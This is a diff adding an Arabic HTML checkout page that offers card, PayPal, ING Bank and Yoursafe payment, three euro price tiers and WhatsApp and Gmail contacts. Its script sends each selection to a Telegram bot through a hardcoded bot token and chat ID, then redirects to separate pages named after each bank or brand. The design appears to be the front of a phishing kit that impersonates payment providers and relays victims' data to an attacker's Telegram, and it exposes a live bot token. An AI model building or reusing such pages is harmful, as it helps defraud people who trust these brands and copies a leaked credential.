@@ -1,0 +1,190 @@
+<!DOCTYPE html><html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>اختيار طريقة الشراء</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px;
+    }
+    .back-btn {
+      align-self: flex-start;
+      margin-bottom: 15px;
+      color: white;
+      text-decoration: none;
+      background: rgba(255,255,255,0.1);
+      padding: 8px 15px;
+      border-radius: 8px;
+    }
+    .back-btn:hover {
+      background: rgba(255,255,255,0.2);
+    }
+    h2 {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    .methods, .prices {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      width: 100%;
+      max-width: 400px;
+    }
+    .method, .price-option {
+      background: rgba(255, 255, 255, 0.15);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .method:hover, .price-option:hover {
+      background: rgba(255, 255, 255, 0.25);
+    }
+    .method img {
+      width: 42px;
+      height: 42px;
+      margin-left: 10px;
+      border-radius: 10px;
+    }
+    .selected {
+      border: 2px solid #00ffcc;
+      background: rgba(0, 255, 204, 0.2);
+    }
+    .checkmark {
+      font-size: 20px;
+      color: #00ffcc;
+      margin-bottom: 15px;
+    }
+    button {
+      margin-top: 25px;
+      padding: 12px 20px;
+      background-color: #00c4cc;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #00a0a6;
+    }
+    .note {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      opacity: 0.9;
+    }
+    .whatsapp-link {
+      margin-top: 10px;
+      font-size: 16px;
+      color: #25D366;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <a class="back-btn" href="index.html">عودة إلى تسجيل الدخول</a>  <h2>اختر طريقة شراء الباقة التي تناسبك</h2>  <div class="methods">
+    <div class="method" onclick="selectMethod(this, 'Idea', 'idea.html')">
+      <img src="https://thumbs.dreamstime.com/b/kiev-ukraine-september-visa-mastercard-logos-printed-white-paper-visa-mastercard-american-multinational-102631953.jpg" alt="Idea">
+      <span>MasterCard / Visa</span>
+      <span class="checkmark"></span>
+    </div>
+    <div class="method" onclick="selectMethod(this, 'PayPal', 'paypal.html')">
+      <img src="https://cdn.pixabay.com/photo/2018/05/08/21/29/paypal-3384015_1280.png" alt="PayPal">
+      <span>PayPal</span>
+      <span class="checkmark"></span>
+    </div>
+    <div class="method" onclick="selectMethod(this, 'ING Bank', 'ing.html')">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSeldGsd4VdWds5RdPUCsiRZkv9QBZRA3Kvxw&s" alt="ING">
+      <span>ING Bank</span>
+      <span class="checkmark"></span>
+    </div>
+    <div class="method" onclick="selectMethod(this, 'Yoursafe', 'yoursafe.html')">
+      <img src="https://play-lh.googleusercontent.com/dFO1hL6JrNQwTWAiR_N6etg8T9o9kO22BqekWQOg19evqYcPS5PkUStcqoCk8VUX-ks" alt="Yoursafe">
+      <span>Yoursafe</span>
+      <span class="checkmark"></span>
+    </div>
+  </div>  <h2 style="margin-top: 40px">اختر سعر الباقة</h2>
+  <div class="prices">
+    <div class="price-option" onclick="selectPrice(this, '€1.99')">
+      <span>€1.99</span>
+      <span class="checkmark"></span>
+    </div>
+    <div class="price-option" onclick="selectPrice(this, '€4.99')">
+      <span>€4.99</span>
+      <span class="checkmark"></span>
+    </div>
+    <div class="price-option" onclick="selectPrice(this, '€9.99')">
+      <span>€9.99</span>
+      <span class="checkmark"></span>
+    </div>
+  </div>  <div class="whatsapp-link">
+    أو تواصل معنا عبر <a href="https://wa.me/31686340649" target="_blank">WhatsApp</a>
+  </div>  <div class="note">
+    إذا لم تتوفر أي طريقة تناسبك، يرجى التواصل عبر البريد: <br>
+    <strong>ezidicode@gmail.com</strong>
+  </div><button onclick="confirmRegister()">سجل الآن</button>
+
+  <script>
+    let selectedMethod = null;
+    let selectedPage = null;
+    let selectedPrice = null;
+
+    function selectMethod(el, method, page) {
+      document.querySelectorAll('.method').forEach(e => {
+        e.classList.remove('selected');
+        e.querySelector('.checkmark').textContent = '';
+      });
+      el.classList.add('selected');
+      el.querySelector('.checkmark').textContent = '✓';
+      selectedMethod = method;
+      selectedPage = page;
+    }
+
+    function selectPrice(el, price) {
+      document.querySelectorAll('.price-option').forEach(e => {
+        e.classList.remove('selected');
+        e.querySelector('.checkmark').textContent = '';
+      });
+      el.classList.add('selected');
+      el.querySelector('.checkmark').textContent = '✓';
+      selectedPrice = price;
+    }
+
+    function confirmRegister() {
+      if (!selectedMethod || !selectedPage || !selectedPrice) {
+        alert('يرجى اختيار طريقة الدفع وسعر الباقة أولاً');
+        return;
+      }
+
+      let chatId = "6431271423";
+      let token = "6618648466:AAFGGTIx055y0eCRvq_z3ABqchHfLsqD0M4";
+      let message = `تم اختيار طريقة الدفع:\nالطريقة: ${selectedMethod}\nسعر الباقة: ${selectedPrice}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert('لقد تم التسجيل بنجاح! سيتم مراجعة طلبك خلال 24 ساعة.');
+        window.location.href = selectedPage;
+      })
+      .catch(error => {
+        console.error("Telegram Error", error);
+        alert('حدث خطأ أثناء إرسال البيانات.');
+      });
+    }
+  </script></body>
+</html>
